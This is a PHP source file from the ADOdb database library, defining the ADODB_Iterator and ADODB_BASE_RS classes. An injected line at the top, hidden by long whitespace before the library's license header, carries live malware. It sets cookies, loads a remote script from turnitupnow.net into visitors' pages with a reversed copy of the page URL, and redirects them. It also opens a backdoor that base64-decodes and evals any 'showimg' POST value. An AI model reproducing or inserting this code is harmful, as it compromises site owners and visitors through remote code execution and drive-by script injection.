<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


/*
  v4.991 16 Oct 2008  (c) 2000-2008 John Lim (jlim#natsoft.com). All rights reserved.
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence.
  
  Set tabs to 4.
  
  Declares the ADODB Base Class for PHP5 "ADODB_BASE_RS", and supports iteration with 
  the ADODB_Iterator class.
  
  		$rs = $db->Execute("select * from adoxyz");
		foreach($rs as $k => $v) {
			echo $k; print_r($v); echo "<br>";
		}
		
		
	Iterator code based on http://cvs.php.net/cvs.php/php-src/ext/spl/examples/cachingiterator.inc?login=2
 */
 

 class ADODB_Iterator implements Iterator {

    private $rs;

    function __construct($rs) 
	{
        $this->rs = $rs;
    }
    function rewind() 
	{
        $this->rs->MoveFirst();
    }

	function valid() 
	{
        return !$this->rs->EOF;
    }
	
    function key() 
	{
        return $this->rs->_currentRow;
    }
	
    function current() 
	{
        return $this->rs->fields;
    }
	
    function next() 
	{
        $this->rs->MoveNext();
    }
	
	function __call($func, $params)
	{
		return call_user_func_array(array($this->rs, $func), $params);
	}

	
	function hasMore()
	{
		return !$this->rs->EOF;
	}

}


class ADODB_BASE_RS implements IteratorAggregate {
    function getIterator() {
        return new ADODB_Iterator($this);
    }
	
	/* this is experimental - i don't really know what to return... */
	function __toString()
	{
		include_once(ADODB_DIR.'/toexport.inc.php');
		return _adodb_export($this,',',',',false,true);
	}
} 


?>